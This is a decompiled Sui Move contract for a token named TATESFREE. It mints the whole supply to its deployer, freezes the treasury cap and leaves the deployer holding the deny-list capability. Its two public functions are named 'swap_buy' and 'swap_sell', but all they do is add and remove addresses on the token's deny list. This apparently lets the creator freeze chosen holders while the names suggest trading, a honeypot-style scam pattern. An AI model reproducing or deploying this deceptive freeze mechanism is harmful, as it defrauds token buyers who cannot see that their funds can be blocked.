module 0x7529bb28f83d039c6d5f68c8c8188e2f01f34aa3571f4388c8b6b68ef54a6f95::tatesfree {
    struct TATESFREE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TATESFREE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TATESFREE>(arg0, 9, b"TATESFREE", b"TATESFREE", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qma5nFRCNUeGtUF1PdkoBRyrqMwEqjq2rbvgm9bnYsXJRT"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TATESFREE>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TATESFREE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TATESFREE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TATESFREE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TATESFREE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TATESFREE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TATESFREE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TATESFREE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

